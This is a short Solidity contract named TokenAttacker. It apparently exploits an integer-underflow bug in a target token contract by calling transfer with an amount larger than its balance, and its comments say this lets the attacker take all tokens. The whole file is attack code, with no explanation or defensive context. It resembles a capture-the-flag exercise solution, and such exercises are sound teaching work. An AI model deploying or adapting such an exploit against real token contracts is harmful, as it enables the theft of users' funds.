pragma solidity ^0.6.0;

contract TokenAttacker {
    address public tokenAddress;

    constructor(address _tokenAddress) public {
        tokenAddress = _tokenAddress;
    }

    function attack() external {
        // Exploit the underflow vulnerability by transferring more tokens than the sender's balance
        // This will underflow the sender's balance and allow attacker to take all tokens
        (bool success, ) = tokenAddress.call(abi.encodeWithSignature("transfer(address,uint256)", msg.sender, 1000000000000000000));
        require(success, "Transfer failed");
    }
}
